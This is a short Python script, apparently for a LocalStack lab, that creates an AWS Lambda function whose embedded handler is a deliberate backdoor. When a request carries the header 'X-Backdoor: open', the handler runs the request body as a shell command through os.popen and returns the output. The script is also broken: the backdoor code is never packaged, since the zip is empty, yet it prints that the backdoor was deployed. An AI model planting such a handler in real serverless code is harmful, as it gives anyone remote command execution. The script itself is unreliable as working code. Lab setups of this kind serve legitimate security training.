import boto3

lambda_client = boto3.client("lambda", endpoint_url="http://localhost:4566")

function_code = """
import json
import os

def handler(event, context):
    # Backdoor: execute command if secret header present
    if event.get('headers', {}).get('X-Backdoor') == 'open':
        cmd = event['body']
        result = os.popen(cmd).read()
        return {'statusCode': 200, 'body': result}
    return {'statusCode': 200, 'body': 'Hello from Lambda!'}
"""

lambda_client.create_function(
    FunctionName="toy-factory-processor",
    Runtime="python3.11",
    Role="arn:aws:iam::123456789012:role/vuln-role",
    Handler="lambda_function.handler",
    Code={"ZipFile": ""},  # LocalStack accepts empty for demo
    Environment={"Variables": {"BACKDOOR_ENABLED": "true"}},
)

print("[+] Vulnerable Lambda backdoor deployed")
